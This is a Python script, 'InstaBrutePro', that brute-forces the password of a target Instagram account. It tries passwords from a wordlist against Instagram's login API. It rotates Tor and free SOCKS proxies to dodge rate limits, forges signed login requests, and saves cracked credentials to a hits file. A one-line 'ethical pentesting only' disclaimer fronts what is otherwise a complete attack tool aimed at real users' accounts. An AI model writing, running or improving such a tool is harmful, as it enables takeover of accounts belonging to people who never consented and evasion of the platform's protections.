#!/usr/bin/env python3
import argparse
import json
import hashlib
import hmac
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import socks
import socket
from queue import Queue

# Colors
class Colors:
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    CYAN = '\033[1;36m'
    NC = '\033[0m'

# Hacker Banner
print(f"{Colors.RED}")
print("  ____            _          ____            _       ___       ")
print(" | __ ) _   _ ___| |__   ___| __ ) _ __ __ _| |__   |_ _|_ __  ")
print(" |  _ \\| | | / __| '_ \\ / __|  _ \\| '__/ _` | '_ \\   | || '_ \\ ")
print(" | |_) | |_| \\__ \\ |_) | (__| |_) | | | (_| | |_) |  | || | | |")
print(" |____/ \\__,_/|___/_.__/ \\___|____/|_|  \\__,_|_.__/  |___|_| |_|")
print(f"           {Colors.CYAN} InstaBrutePro v1.0 - by Soly {Colors.NC}")
print(f"{Colors.YELLOW}[*] Elite Instagram Brute-Forcer for Ethical Pentesting Only{Colors.NC}")
print(f"{Colors.RED}[!] Legal: Consent REQUIRED. Unauthorized use ILLEGAL.{Colors.NC}\n")

# Config
with open('config/instabrute_config.json', 'r') as f:
    CONFIG = json.load(f)
THREADS = CONFIG['threads']
DELAY = CONFIG['delay']
TOR_PORTS = CONFIG['tor_ports']
LOGIN_URL = "https://i.instagram.com/api/v1/accounts/login/"
UA = "Instagram 350.0.0.21.114 Android (34/14; 560dpi; 1440x3120; samsung; SM-S928B; dm3q; exynos5400; en_US; 350000000000000)"
APP_ID = "567067343352427"
SIG_KEY = "686a36310a594a8f4a2f3c1d5b4b5a5e"  # Update from APK if needed

# Global
found = False
lock = threading.Lock()
resume_line = 0

def is_valid_proxy(proxy):
    """Validate proxy format and connectivity."""
    if not proxy.startswith('socks5://'):
        return False
    try:
        host, port = proxy.split('://')[1].split(':')
        port = int(port)
        if host == 'placeholder' or not host or port < 1 or port > 65535:
            return False
        socks.set_default_proxy(socks.SOCKS5, host, port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect(('google.com', 80))
        sock.close()
        return True
    except:
        return False

def get_proxies():
    proxies = [f"socks5://127.0.0.1:{port}" for port in TOR_PORTS]
    try:
        with open('proxies/free_proxies.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if line and is_valid_proxy(line):
                    proxies.append(line)
    except FileNotFoundError:
        print(f"{Colors.RED}[!] Proxies file missing! Using Tor only.{Colors.NC}")
    random.shuffle(proxies)
    return proxies[:200]

def sort_proxies(proxies):
    working = []
    print(f"{Colors.YELLOW}[*] Sorting proxies...{Colors.NC}")
    with ThreadPoolExecutor(max_workers=50) as exec:
        working = [p for p in exec.map(lambda p: p if is_valid_proxy(p) else None, proxies) if p]
    with open('proxies/working_proxies.txt', 'w') as f:
        f.write('\n'.join(working))
    print(f"{Colors.GREEN}[+] {len(working)} working proxies saved!{Colors.NC}")
    return working

def get_csrf(proxies):
    for _ in range(3):  # Retry 3 times
        proxy = random.choice(proxies)
        if not is_valid_proxy(proxy):
            print(f"{Colors.RED}[!] Skipping invalid proxy: {proxy}{Colors.NC}")
            continue
        session = requests.Session()
        session.proxies = {'http': proxy, 'https': proxy}
        retry = Retry(total=3, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.headers = {'User-Agent': UA}
        print(f"{Colors.YELLOW}[*] Fetching CSRF token via {proxy}...{Colors.NC}")
        try:
            resp = session.get("https://www.instagram.com/accounts/login/", timeout=10)
            csrf = resp.cookies.get('csrftoken', '')
            session.close()
            if csrf:
                print(f"{Colors.GREEN}[+] CSRF token obtained!{Colors.NC}")
                return csrf
            print(f"{Colors.RED}[!] No CSRF token - Retrying...{Colors.NC}")
        except requests.RequestException as e:
            print(f"{Colors.RED}[!] CSRF fetch error: {e}{Colors.NC}")
        finally:
            session.close()
    return None

def sign_payload(payload):
    body = json.dumps(payload, separators=(',', ':'))
    sig = hmac.new(SIG_KEY.encode(), body.encode(), hashlib.sha256).hexdigest()
    return f"ig_sig_key_version=4&signed_body={sig}.{body}"

def try_password(username, password, proxy, csrf):
    global found
    if not is_valid_proxy(proxy):
        print(f"{Colors.RED}[!] Invalid proxy: {proxy}{Colors.NC}")
        return False
    session = requests.Session()
    session.proxies = {'http': proxy, 'https': proxy}
    session.headers = {
        'User-Agent': UA,
        'X-IG-App-ID': APP_ID,
        'X-CSRFToken': csrf,
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': '*/*',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
    }
    timestamp = str(int(time.time()))
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }
    signed = sign_payload(payload)
    try:
        resp = session.post(LOGIN_URL, data=signed, timeout=10)
        time.sleep(DELAY + random.uniform(0, 0.5))
        if '"authenticated":true' in resp.text:
            with lock:
                print(f"{Colors.GREEN}[+] CRACKED! {username}:{password}{Colors.NC}")
                with open('hits/cracked.txt', 'a') as f:
                    f.write(f"{username}:{password}\n")
                found = True
                return True
        elif 'checkpoint_required' in resp.text:
            print(f"{Colors.YELLOW}[!] Checkpoint on {password} - Manual verify?{Colors.NC}")
        elif '"spam":true' in resp.text:
            print(f"{Colors.RED}[!] Rate limit - Rotating proxy{Colors.NC}")
            return False
        else:
            print(f"{Colors.CYAN}[-] Fail: {password[:10]}...{Colors.NC}")
        return False
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.NC}")
        return False
    finally:
        session.close()

def worker(queue, username, proxies, csrf):
    while not queue.empty() and not found:
        pw = queue.get()
        proxy = random.choice(proxies)
        try_password(username, pw, proxy, csrf)
        queue.task_done()

def main():
    global resume_line
    parser = argparse.ArgumentParser(description="InstaBrutePro: Elite Instagram Brute-Forcer by Soly")
    parser.add_argument('-u', required=True, help='Target username')
    parser.add_argument('-w', default='wordlists/rockyou_sample.txt', help='Wordlist path')
    parser.add_argument('-t', type=int, default=THREADS, help='Threads')
    parser.add_argument('-r', action='store_true', help='Resume session')
    parser.add_argument('-p', default='proxies/working_proxies.txt', help='Proxy file')
    parser.add_argument('-d', type=float, default=DELAY, help='Delay (s)')
    args = parser.parse_args()

    # Validate user
    print(f"{Colors.YELLOW}[*] Validating username: {args.u}...{Colors.NC}")
    import subprocess
    result = subprocess.run(['python', 'validate_user.py', args.u], capture_output=True, text=True)
    if "Valid" not in result.stdout:
        print(f"{Colors.RED}[-] Invalid username. Exiting.{Colors.NC}")
        return

    # Load wordlist
    print(f"{Colors.YELLOW}[*] Loading wordlist: {args.w}...{Colors.NC}")
    try:
        with open(args.w, 'r', encoding='utf-8', errors='ignore') as f:
            words = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Colors.RED}[!] Wordlist not found: {args.w}{Colors.NC}")
        return
    if args.r:
        resume_line = int(input(f"{Colors.YELLOW}Resume from line (0 for start): {Colors.NC}") or 0)
        words = words[resume_line:]

    # Proxies
    print(f"{Colors.YELLOW}[*] Loading proxies...{Colors.NC}")
    try:
        with open(args.p, 'r') as f:
            proxies = [line.strip() for line in f if line.strip() and is_valid_proxy(line)]
    except FileNotFoundError:
        proxies = []
    if not proxies:
        proxies = get_proxies()
        proxies = sort_proxies(proxies)
    if not proxies:
        print(f"{Colors.RED}[!] No valid proxies available! Start Tor with ./multitor.sh{Colors.NC}")
        return
    print(f"{Colors.GREEN}[+] Loaded {len(words)} passwords, {len(proxies)} proxies, {args.t} threads{Colors.NC}")

    # CSRF
    csrf = get_csrf(proxies)
    if not csrf:
        print(f"{Colors.RED}[-] Failed to fetch CSRF token - Check proxies/Tor{Colors.NC}")
        return

    queue = Queue()
    for word in words:
        queue.put(word)

    print(f"{Colors.CYAN}[*] Starting brute-force on {args.u}... Buckle up!{Colors.NC}")
    with ThreadPoolExecutor(max_workers=args.t) as exec:
        futures = [exec.submit(worker, queue, args.u, proxies, csrf) for _ in range(args.t)]
        for future in futures:
            future.result()

    print(f"{Colors.GREEN}[+] Brute-force complete! Check hits/cracked.txt{Colors.NC}")

if __name__ == "__main__":
    main()